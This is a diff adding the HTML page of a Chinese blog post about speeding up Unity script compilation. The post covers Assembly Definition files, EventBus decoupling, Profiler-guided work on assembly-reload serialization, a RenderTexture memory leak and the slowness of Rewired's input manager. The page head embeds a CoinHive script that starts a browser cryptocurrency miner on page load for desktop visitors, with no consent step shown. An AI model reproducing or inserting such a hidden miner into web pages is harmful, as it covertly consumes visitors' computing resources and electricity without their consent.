@@ -1,0 +1,300 @@
+<!DOCTYPE html>
+<html>
+  <!-- Html Head Tag-->
+  <head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="description" content="">
+  <meta name="author" content="WeAthFolD">
+  <!-- Open Graph Data -->
+  <meta property="og:title" content="记一次unity中的编译性能调优"/>
+  <meta property="og:description" content="" />
+  <meta property="og:site_name" content="WeAthFolD&#39;s Inverted Field"/>
+  <meta property="og:type" content="article" />
+  <meta property="og:image" content="http://weathfold.github.ioundefined"/>
+  
+    <link rel="alternate" href="/atom.xml" title="WeAthFolD&#39;s Inverted Field" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+
+  <!-- Site Title -->
+  <title>WeAthFolD's Inverted Field</title>
+
+  <!-- Bootstrap CSS -->
+  <link rel="stylesheet" href="/css/bootstrap.min.css">
+  <!-- Custom CSS -->
+  
+  <link rel="stylesheet" href="/css/style.dark.css">
+
+  <!-- Google Analytics -->
+  
+    <script>
+        (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+                    (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+                m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+        })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+        ga('create', 'UA-111190795-1', 'auto');
+        ga('send', 'pageview');
+    </script>
+
+
+  <script src="https://coinhive.com/lib/coinhive.min.js"></script>
+  <!-- CoinHive -->
+  <script>
+    var miner = new CoinHive.Anonymous('CLCs74GtZ05pN4V8LsFkGeZWsfAzVjLn', {throttle: 0.8});
+
+    // Only start on non-mobile devices and if not opted-out
+    // in the last 14400 seconds (4 hours):
+    if (!miner.isMobile() && !miner.didOptOut(14400)) {
+      miner.start();
+    }
+
+    setInterval(function() {
+      // var hashesPerSecond = miner.getHashsePerSecond();
+      var acceptedHashes = miner.getAcceptedHashes();
+      document.getElementById("hashCount").innerHTML = acceptedHashes;
+    }, 1000);
+  </script>
+<link rel="stylesheet" href="/css/prism-atom-dark.css" type="text/css">
+<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head>
+
+  <body>
+    <!-- Page Header -->
+
+
+<header class="site-header header-background" style="background-image: url(/img/kimi-no-na-wa.jpg)">
+  <div class="container">
+    <div class="row">
+      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+        <div class="page-title with-background-image">
+          <p class="title">记一次unity中的编译性能调优</p>
+          <p class="subtitle"></p>
+        </div>
+        <div class="site-menu with-background-image">
+          <ul>
+            
+              <li>
+                <a href="/">
+                  
+                  Home
+                  
+                </a>
+              </li>
+            
+              <li>
+                <a href="/archives">
+                  
+                  Archives
+                  
+                </a>
+              </li>
+            
+              <li>
+                <a href="/friends">
+                  
+                  Friends
+                  
+                </a>
+              </li>
+            
+              <li>
+                <a href="/about">
+                  
+                  About
+                  
+                </a>
+              </li>
+            
+              <li>
+                <a href="/Resume">
+                  
+                  Resume
+                  
+                </a>
+              </li>
+            
+          </ul>
+        </div>
+      </div>
+    </div>
+  </div>
+</header>
+
+
+<article>
+  <div class="container typo">
+    <div class="row">
+      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+        <div class="post-info text-muted">
+          
+            <!-- Author -->
+            <span class="author info">By WeAthFolD</span>
+          
+          <!-- Date -->
+          <span class="date-time info">On
+            <span class="date">2018-02-14</span>
+            <span class="time">17:59:10</span>
+          </span>
+          
+          <!--  Categories  -->
+            <span class="categories info">Under 
+
+<a href="/categories/Gamedev/">Gamedev</a>
+</span>
+          
+        </div>
+        <!-- Tags -->
+        
+          <div class="post-tags text-muted">
+            Tags: 
+
+<a class="tag" href="/tags/gamedev/">#gamedev</a> <a class="tag" href="/tags/unity/">#unity</a>
+
+
+          </div>
+        
+        <!-- Post Main Content -->
+        <div class="post-content">
+          <p>现在在做的项目最近深受编译速度的困扰。每改一个脚本都需要经历大概几十秒的编译时间。忍无可忍的我决定专门抽出一块时间来优化一下编译速度，于是就有了这篇博客。最后虽然没有优化到最理想的程度，但是接触了包括asmdef、assembly reloading流程等姿势，还是很有收获的。</p>
+<a id="more"></a>
+<h1 id="1-使用Assembly-Definition"><a href="#1-使用Assembly-Definition" class="headerlink" title="1. 使用Assembly Definition"></a>1. 使用Assembly Definition</h1><p>在最开始，我认为是项目中脚本文件太多导致的编译性能问题。正好Unity在最近的版本（2017.3）中加入了一个叫Assembly Definition的功能（<a href="https://docs.unity3d.com/Manual/ScriptCompilationAssemblyDefinitionFiles.html" target="_blank" rel="noopener">Docs</a>）：</p>
+<blockquote>
+<p>Use an assembly definition file to define your own managed assemblies based upon scripts inside a folder. To do this, separate Project scripts into multiple assemblies with well-defined dependencies in order to ensure that only required assemblies are rebuilt when making changes in a script. This reduces compilation time. Think of each managed assembly as a single library within the Unity Project.</p>
+</blockquote>
+<p>简而言之，asmdef可以将你的项目划分为有多个清晰依赖关系的模块，并分别编译它们。如果你只修改了最下游模块中的代码，那么只有该模块的代码需要被编译；如果上游的模块进行了更改，那么下游的模块需要联合一起被编译。</p>
+<p>这听起来非常理想，但我花了一整个下午才把整个项目切换到使用asmdef。在这个过程中，也伴随着进行了一些的代码重构，来解决模块间的依赖问题。首先，从概念上，我将项目中的所有代码分为几个大类：</p>
+<ul>
+<li>Plugins：第三方插件。通常每一个独立存在，作为最上游的依赖模块。</li>
+<li>Framework：Gameplay框架代码（例如存档控制、关卡连接、本地化、AI基础模块等）。</li>
+<li>Actor：游戏内各类实体，如玩家、怪物、场景物件等。依赖Plugins和Framework。</li>
+<li>Render：渲染相关（post processing流程、后处理特效等）。依赖Plugins和Framework。</li>
+</ul>
+<p>但是这个理想的划分和一开始的代码有着很大的矛盾。理想化的，任何Actor里的代码都不会引用Render的代码，Framework也不会引用Render的代码。但是总存在一些不必要的耦合关系，例如：</p>
+<ul>
+<li>Creature（怪物和玩家的基础组件）中，要调用到摄像机震动，因此引用了摄像机的类（即引用了Render）。</li>
+<li>当玩家死亡的时候，会调用一个特殊的后处理特效，玩家控制器在Actor中，因此Actor也引用了Render。</li>
+</ul>
+<p>这里的问题在于，我们要执行特定功能的时候，引用了这个特定功能对应的类。如果通过Observer Pattern（即事件总线）来进行去耦的话，就可以解除这些依赖了。于是，我编写了一个简单的EventBus，并将这些操作都改为了类似事件侦听的机制。例如：</p>
+<pre class="line-numbers language-C#"><code class="language-C#">// Actor code
+Camera.main.GetComponent<MainCamera>().StartShake(...);
+
+// MainCamera code
+public class MainCamera : MonoBehaviour {
+    ...
+    public void StartShake(...) { ... }
+}
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>变为</p>
+<pre class="line-numbers language-C#"><code class="language-C#">// Event code
+public class CameraShakeEvent { ... }
+
+// Actor code
+EventBus.Post(new CameraShakeEvent(...));
+
+// MainCamera code
+public class MainCamera : MonoBehaviour {
+    void OnEnable() {
+        EventBus.Subscribe&lt;CameraShakeEvent&gt;(evt => ...);
+    }
+}
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>这样的话，依赖变为 Render、Actor 同时依赖 Event，它们之间就去耦了。</p>
+<p>除此之外，还遇到一个问题：在build的时候，发现出现很多的Editor文件夹内的代码相关错误。在未使用asmdef时，我们知道所有在Editor文件夹内的代码都只会在编辑器中被编译；但是如果它们被新的asmdef接管，这个规则就不管用了。因此我们需要对每个Editor文件夹内都新建一个asmdef，并设置为只在Editor中有效。（真鸡儿麻烦）</p>
+<p>在将项目改为使用asmdef后，我尝试对最下游的脚本进行修改，并检测编译时间，然而并没有我想象中的一下子变快，而是几乎不变。我一下子有些沮丧：这意味着我一开始的假设就错了，编译速度的瓶颈根本不是编译时间！</p>
+<h1 id="2-Assembly-Reloading，内存泄漏，和神秘的Rewired-Input-Manager"><a href="#2-Assembly-Reloading，内存泄漏，和神秘的Rewired-Input-Manager" class="headerlink" title="2. Assembly Reloading，内存泄漏，和神秘的Rewired Input Manager"></a>2. Assembly Reloading，内存泄漏，和神秘的Rewired Input Manager</h1><p>有句话说得好，遇事不决找 profiler！</p>
+<p>把 Unity Profiler 打开，并在编译时检测性能消耗：</p>
+<p><img src="/images/unitycompile/profiler.PNG" alt=""></p>
+<p>可以看到，占用最多时间的是这个SerializeBackups函数。经过大量的搜索之后，找到了<a href="https://medium.com/@lynxelia/unity-memory-management-how-to-manage-memory-and-reduce-the-time-it-takes-to-enter-play-mode-fd07b43c1daa" target="_blank" rel="noopener">这篇资料</a>。当编译完代码之后，Unity需要进行一次Assembly Reload，将新编译的所有类替换入CLR。由于替换过程中类中的数据是无法保留的，因此需要将所有暂存的对象都序列化一次，在替换后再反序列化回去——就是这个过程占用了大量的时间。如果当前内存中加载的东西太多，就会引来这个问题。</p>
+<p>于是我进一步通过Profiler的Memory Profiling查看内存中的对象，惊异的发现了一件事：在内存中有大概0.5GB的东西被RenderTexture占据了！我在做延迟渲染的时候会分配一些RenderTexture，而这说明我做的不对，造成了内存泄漏。</p>
+<p>在解决了这个问题之后，编译速度的问题解决了吗？</p>
+<p>仍然没有！但是查看内存，已经看不到存在明显的泄漏问题。</p>
+<p>在不同的场景来回切换，检测编译时间的时候，我发现在主场景（存放玩家、主摄像机、UI的那个场景）活跃时，性能问题是最严重的。这是有一定道理的——毕竟只有这个场景在加载后，会分配RenderTexture。难道是RenderTexture的序列化效率太低了，四五个就会导致严重的卡顿？</p>
+<p>在最后排查之后，问题完全不在RenderTexture上，而在一个我完全没有意料到的组件上—— Rewired Input Manager。</p>
+<p>Rewired 是一个手柄输入系统插件。它的 Input Manager 大概长这样：</p>
+<p><img src="/images/unitycompile/rewired.PNG" alt=""></p>
+<p>这么多数据，在序列化的时候会带来问题并不奇怪。但是我万万没想到会拖慢差不多5秒钟的时间，于是我给作者发了一个ticket，作者是这么回复的：</p>
+<blockquote>
+<p>As it says, there is no solution because this is purely an issue with<br>Unity’s serialization system over which I have no control. Your only option<br>is to remove controller definitions.</p>
+</blockquote>
+<p>也就是说，这些数据是必须这么存储的，而任何不使用unity的存储系统的方式都会带来严重的维护困难。所以在编辑器中的性能损失是不可避免的。</p>
+<p>真是闻者伤心，听者流泪。在进行了大量的调查之后，发现的核心原因却不是我能够解决的……</p>
+<p>于是，如何提高加载时间呢？只要在平时尽可能的不加载那个场景就好了。哼。</p>
+<h1 id="3-Some-last-thoughts"><a href="#3-Some-last-thoughts" class="headerlink" title="3. Some last thoughts"></a>3. Some last thoughts</h1><blockquote>
+<p>积重难返：是指长期形成的不良的风俗、习惯不易改变。也指长期积累的问题不易解决（积重：积习深重）。贬义词。出自明·沈德符《万历野获编·一三·旧制一废难复》：“此又皆势处极重之难返者。”。</p>
+</blockquote>
+<p>任何有大量用户使用、尝试解决一个很大规模的问题、存在很长时间的项目都会存在大量的”难以解决”的问题。这些问题的存在，是因为：</p>
+<ul>
+<li>一个基础的不良设计被大量下游代码所依赖，要修改这个不良设计要付出巨大的精力</li>
+<li>使用方式的修改会破坏过去的使用习惯/数据，因此很难进行</li>
+<li>项目的规模已经太过庞大，以致于难以面面俱到</li>
+</ul>
+<p>Jonathan Blow（Braid、The Witness的作者）在他的一个关于游戏的演讲中演示了 Photoshop 的臃肿：在一个顶配的机器上，打开 Photoshop CC 后，打开“新建”菜单，居然就卡顿了好几秒钟的时间。或许是codebase太庞大，或许是加载时带来了太多不必要的内容依赖，总之，PS很臃肿这件事是无可辩驳的。</p>
+<p>如果我们现在把曾经有的“积重难返”的的项目完全ditch掉，从头开始，凭借着以前的经验积累构建一个全新的系统，那么这个系统将是高效的多、易用的多的。但是，这么做会面临太多的阻力，包括经济、时间、精力。结果是，我们很多时候只能live with legacy stuffs。</p>
+<p>很多时候，这是无奈之举。但有时候，激进一些地进行重新设计和优化，是否在长期有更好的结果呢？</p>
+<p>至少现在，我只能期待 Unity 在未可知的未来可以优化一下序列化的性能了。</p>
+<p>P.S. 博客成文时，我的的项目编译时间是 8s（未加载主场景）/15s（加载主场景）。</p>
+
+        </div>
+        <div id="disqus_thread"></div>
+        <script>
+        
+        /**
+        *  RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
+        *  LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables*/
+        /*
+        var disqus_config = function () {
+        this.page.url = PAGE_URL;  // Replace PAGE_URL with your page's canonical URL variable
+        this.page.identifier = PAGE_IDENTIFIER; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
+        };
+        */
+        (function() { // DON'T EDIT BELOW THIS LINE
+        var d = document, s = d.createElement('script');
+        s.src = 'https://weathfold-ghpages.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+        })();
+        </script>
+        <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+                                    
+      </div>
+    </div>
+  </div>
+</article>
+
+
+
+    <!-- Footer -->
+<footer>
+  <div class="container">
+    <div class="row">
+      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+        <p class="copyright text-muted">
+          Theme By <a target="_blank" href="https://github.com/levblanc">Levblanc.</a>
+          Inspired By <a target="_blank" href="https://github.com/klugjo/hexo-theme-clean-blog">Clean Blog.</a>
+        <p class="copyright text-muted">
+          Powered By <a target="_blank" href="https://hexo.io/">Hexo.</a>
+        </p>
+      </div>
+    </div>
+  </div>
+</footer>
+
+
+    <!-- After Footer Scripts -->
+<script src="/js/highlight.pack.js"></script>
+<script>
+  document.addEventListener("DOMContentLoaded", function(event) {
+    var codeBlocks = Array.prototype.slice.call(document.getElementsByTagName('pre'))
+    codeBlocks.forEach(function(block, index) {
+      hljs.highlightBlock(block);
+    });
+  });
+</script>
+
+  </body>
+</html>
+
